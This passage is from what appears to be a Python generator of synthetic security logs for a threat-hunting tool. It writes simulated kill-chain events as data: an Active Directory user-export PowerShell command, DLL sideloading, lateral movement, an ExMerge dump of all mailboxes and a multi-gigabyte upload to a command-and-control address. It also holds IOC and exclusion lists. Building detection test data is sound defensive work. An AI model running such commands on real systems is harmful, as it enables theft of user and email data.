            "process": {
                "name": "powershell.exe",
                "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "command_line": (
                    "powershell.exe -c "
                    "\"Import-Module ActiveDirectory; "
                    "Get-ADUser -Filter * -Properties * | "
                    "Export-Csv C:\\Windows\\Temp\\users.csv\""
                ),
                "pid": rand_pid(),
                "parent": {"name": "cmd.exe", "pid": rand_pid()},
            },
            "user": {"name": ATTACKER_USER2, "domain": DOMAIN, "privilege_level": "standard"},
            "event": {"type": "process_start", "id": "proc-kc-recon"},
            "message": "SUSPICIOUS: AD enumeration — all user accounts exported to CSV",
        },
    })

    # T-12m: Initial compromise — malicious DLL sideloading
    docs.append({
        "_index": "nightwatch-process-logs",
        "_source": {
            "@timestamp": ts(now - timedelta(minutes=12)),
            "host": {"name": "WS-042", "os": "Windows 10"},
            "process": {
                "name": "onedrive.exe",
                "executable": "C:\\Users\\svc.deploy\\AppData\\Local\\OneDrive\\onedrive.exe",
                "command_line": "onedrive.exe",
                "pid": rand_pid(),
                "parent": {"name": "explorer.exe", "pid": rand_pid()},
                "loaded_dlls": ["version.dll"],
            },
            "dll": {
                "name": "version.dll",
                "path": "C:\\Users\\svc.deploy\\AppData\\Local\\OneDrive\\version.dll",
                "hash": {"sha256": "deadbeef1234567890abcdef1234567890abcdef1234567890abcdef12345678"},
                "signed": False,
            },
            "user": {"name": ATTACKER_USER2, "domain": DOMAIN, "privilege_level": "standard"},
            "event": {"type": "dll_load", "id": "proc-kc-dll"},
            "message": (
                "SUSPICIOUS: onedrive.exe loaded unsigned version.dll from user directory "
                "— DLL sideloading for code execution"
            ),
        },
    })

    # T-10m: Lateral movement to MAIL-001
    docs.append({
        "_index": "nightwatch-auth-logs",
        "_source": {
            "@timestamp": ts(now - timedelta(minutes=10)),
            "event": {
                "type": "authentication",
                "outcome": "success",
                "action": "logon",
                "id": "evt-kc-lateral",
            },
            "user": {"name": ATTACKER_USER2, "domain": DOMAIN},
            "source": {"ip": rand_internal_ip(20), "port": rand_port()},
            "destination": {"host": "MAIL-001", "ip": rand_internal_ip(20)},
            "authentication": {
                "method": "ntlm",
                "logon_type": "network",
            },
            "host": {"name": "MAIL-001", "os": "Windows Server 2022"},
            "message": (
                "SUSPICIOUS: Lateral movement — svc.deploy authenticated to "
                "MAIL-001 via NTLM (no MFA, off-hours)"
            ),
        },
    })

    # T-8m: Email archive extraction from Exchange
    docs.append({
        "_index": "nightwatch-process-logs",
        "_source": {
            "@timestamp": ts(now - timedelta(minutes=8)),
            "host": {"name": "MAIL-001", "os": "Windows Server 2022"},
            "process": {
                "name": "exmerge.exe",
                "executable": "C:\\ExchangeTools\\exmerge.exe",
                "command_line": (
                    "exmerge.exe /d /f All_Mailboxes "
                    "/o C:\\Windows\\Temp\\email_export\\"
                ),
                "pid": rand_pid(),
                "parent": {"name": "cmd.exe", "pid": rand_pid()},
            },
            "user": {"name": ATTACKER_USER2, "domain": DOMAIN, "privilege_level": "admin"},
            "event": {"type": "process_start", "id": "proc-kc-email"},
            "message": (
                "CRITICAL: ExMerge extracting all mailboxes to Temp directory "
                "on MAIL-001 — bulk email data theft"
            ),
        },
    })

    # T-5m: Exfiltration of email archive via HTTPS
    docs.append({
        "_index": "nightwatch-network-logs",
        "_source": {
            "@timestamp": ts(now - timedelta(minutes=5)),
            "source": {"ip": rand_internal_ip(20), "port": rand_port(), "host": "MAIL-001"},
            "destination": {
                "ip": C2_IP_BEACON,
                "port": 443,
                "domain": "upload.secure-files-cdn.com",
            },
            "network": {
                "protocol": "https",
                "bytes": random.randint(2_000_000_000, 5_000_000_000),
                "direction": "outbound",
            },
            "host": {"name": "MAIL-001"},
            "event": {"type": "connection"},
            "message": (
                f"CRITICAL: Multi-GB HTTPS upload from MAIL-001 to {C2_IP_BEACON} "
                f"— email archive exfiltration (kill-chain finale)"
            ),
        },
    })

    return docs


# ---------------------------------------------------------------------------
# THREAT INTEL — extended IOC list
# ---------------------------------------------------------------------------

def generate_threat_intel() -> list:
    """Expanded threat intelligence covering all attack scenarios."""
    docs = []
    now = now_utc()

    threat_indicators = [
        # Original IOCs
        {
            "type": "ip", "value": C2_IP_PRIMARY,
            "name": "APT-29 C2 Server", "severity": "critical",
            "technique": "T1071.004", "category": "apt",
        },
        {
            "type": "domain", "value": C2_DOMAIN,
            "name": "Known C2 Domain", "severity": "critical",
            "technique": "T1048.003", "category": "apt",
        },
        {
            "type": "hash",
            "value": "a1b2c3d4e5f6789012345678901234567890abcdef012345678901234567890abc",
            "name": "Mimikatz Variant (PowerShell stager)", "severity": "high",
            "technique": "T1003", "category": "credential_theft",
        },
        {
            "type": "process", "value": "svchost_update.exe",
            "name": "Renamed Mimikatz", "severity": "high",
            "technique": "T1036", "category": "credential_theft",
        },
        # New IOCs for extended scenarios
        {
            "type": "ip", "value": C2_IP_BEACON,
            "name": "C2 Beacon Endpoint", "severity": "critical",
            "technique": "T1071.001", "category": "c2_infrastructure",
        },
        {
            "type": "domain", "value": FTP_EXFIL_HOST,
            "name": "FTP Exfiltration Drop Site", "severity": "critical",
            "technique": "T1048.002", "category": "exfiltration",
        },
        {
            "type": "ip", "value": FTP_EXFIL_IP,
            "name": "Tor Exit Node / Drop Server", "severity": "high",
            "technique": "T1048.002", "category": "exfiltration",
        },
        {
            "type": "hash",
            "value": "deadbeef1234567890abcdef1234567890abcdef1234567890abcdef12345678",
            "name": "Malicious version.dll (DLL sideloading)", "severity": "high",
            "technique": "T1574.002", "category": "defense_evasion",
        },
        {
            "type": "process", "value": "fodhelper.exe",
            "name": "UAC Bypass Utility", "severity": "medium",
            "technique": "T1548.002", "category": "privilege_escalation",
        },
        {
            "type": "domain", "value": "cdn.secure-updates-global.com",
            "name": "Fake CDN used for C2 masquerade", "severity": "high",
            "technique": "T1071.001", "category": "c2_infrastructure",
        },
        {
            "type": "domain", "value": "upload.secure-files-cdn.com",
            "name": "Exfiltration staging domain", "severity": "critical",
            "technique": "T1567", "category": "exfiltration",
        },
    ]

    for ioc in threat_indicators:
        docs.append({
            "_index": "nightwatch-threat-intel",
            "_source": {
                "@timestamp": ts(now),
                "ioc": {"type": ioc["type"], "value": ioc["value"]},
                "threat": {
                    "name": ioc["name"],
                    "category": ioc["category"],
                    "severity": ioc["severity"],
                    "description": f"Known malicious indicator: {ioc['name']}",
                    "mitre_technique": ioc["technique"],
                },
                "source": "NIGHTWATCH-ThreatFeed-v2",
            },
        })

    # Exception patterns (benign baselines for ADVOCATE)
    exception_patterns = [
        {
            "pattern_type": "it_admin_patching",
            "description": (
                "IT admins perform monthly patch deployment via RDP on the first "
                "Tuesday of each month between 22:00-06:00."
            ),
            "esql_exclusion": (
                "user.name IN ('admin.patching', 'svc_sccm') AND "
                "authentication.logon_type == 'remote_interactive'"
            ),
            "active": True,
        },
        {
            "pattern_type": "backup_service",
            "description": (
                "Backup service account performs nightly SMB transfers "
                "between FS-001 and BACKUP-SRV."
            ),
            "esql_exclusion": (
                "user.name == 'svc_backup' AND destination.host == 'BACKUP-SRV'"
            ),
            "active": True,
        },
        {
            "pattern_type": "onedrive_sync",
            "description": "OneDrive client regularly syncs to Microsoft CDN.",
            "esql_exclusion": (
                "process.name == 'onedrive.exe' AND "
                "destination.domain LIKE '*.onedrive.live.com'"
            ),
            "active": True,
        },
    ]

    for pattern in exception_patterns:
        docs.append({
            "_index": "nightwatch-threat-intel",
            "_source": {
                "@timestamp": ts(now),
                "exception_pattern": pattern,
                "source": "NIGHTWATCH-ExceptionDB",
            },
        })

    return docs


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def wipe_indices() -> None:
    for index in INDICES:
        if es.indices.exists(index=index):
            es.indices.delete(index=index)
            print(f"  Deleted index: {index}")


def main() -> None:
    parser = argparse.ArgumentParser(description="NIGHTWATCH Hunt Data Generator")
    parser.add_argument(
        "--days", type=int, default=7,
        help="Number of days of normal baseline traffic to generate (default: 7)",
    )
    parser.add_argument(
        "--wipe", action="store_true",
        help="Delete existing indices before indexing (fresh start)",
    )
    args = parser.parse_args()

    if args.wipe:
        print("Wiping existing indices...")
        wipe_indices()

    print(f"Generating NIGHTWATCH extended dataset ({args.days} days of baseline)...")
    print(f"Attack events timestamped within last 15 minutes (hunt window): "
          f"{(now_utc() - timedelta(minutes=15)).strftime('%H:%M:%S')} — "
          f"{now_utc().strftime('%H:%M:%S')} UTC")

    all_docs = []

    # --- Normal baseline (5x volume) ---
    print(f"\nGenerating {args.days} days of baseline traffic (5x volume)...")
    for day in range(args.days):
        all_docs.extend(generate_normal_auth_logs(day, count=1000))
        all_docs.extend(generate_normal_process_logs(day, count=750))
        all_docs.extend(generate_normal_network_logs(day, count=500))
    baseline_count = len(all_docs)
    print(f"  Baseline docs: {baseline_count:,}")

    # --- Attack scenarios ---
    print("\nGenerating attack scenarios (all 6 phases)...")

    # initial_compromise
    ic_docs = generate_brute_force_attack() + generate_phishing_macro_attack()
    all_docs.extend(ic_docs)
    print(f"  initial_compromise:     {len(ic_docs):>4} docs")

    # lateral_movement
    lm_docs = generate_pass_the_hash_attack() + generate_wmi_lateral_movement()
    all_docs.extend(lm_docs)
    print(f"  lateral_movement:       {len(lm_docs):>4} docs")

    # privilege_escalation
    pe_docs = (
        generate_lsass_dump()
        + generate_kerberoasting()
        + generate_uac_bypass()
    )
    all_docs.extend(pe_docs)
    print(f"  privilege_escalation:   {len(pe_docs):>4} docs")

    # data_exfiltration
    de_docs = (
        generate_dns_tunneling()
        + generate_large_https_exfil()
        + generate_ftp_exfil()
    )
    all_docs.extend(de_docs)
    print(f"  data_exfiltration:      {len(de_docs):>4} docs")

    # persistence
    ps_docs = (
        generate_scheduled_task_persistence()
        + generate_registry_run_key()
        + generate_malicious_service()
    )
    all_docs.extend(ps_docs)
    print(f"  persistence:            {len(ps_docs):>4} docs")

    # multi_phase
    mp_docs = generate_c2_beaconing() + generate_kill_chain()
    all_docs.extend(mp_docs)
    print(f"  multi_phase:            {len(mp_docs):>4} docs")

    # threat intel
    ti_docs = generate_threat_intel()
    all_docs.extend(ti_docs)
    print(f"  threat_intel IOCs:      {len(ti_docs):>4} docs")

    attack_count = len(all_docs) - baseline_count
    print(f"\nTotal: {len(all_docs):,} docs ({baseline_count:,} baseline + {attack_count} attack/intel)")

    # --- Bulk index ---
    print("\nIndexing to Elasticsearch...")
    success, errors = helpers.bulk(es, all_docs, stats_only=True, raise_on_error=False)
    print(f"Indexed: {success:,}  Errors: {errors}")

    # --- Verify ---
    print("\nIndex counts:")
    for index in INDICES:
        try:
            count = es.count(index=index)["count"]
            print(f"  {index}: {count:,} documents")
        except Exception as exc:
            print(f"  {index}: ERROR — {exc}")

    print("\nDone. Trigger a Hunt to detect the injected threats.")


if __name__ == "__main__":
    main()
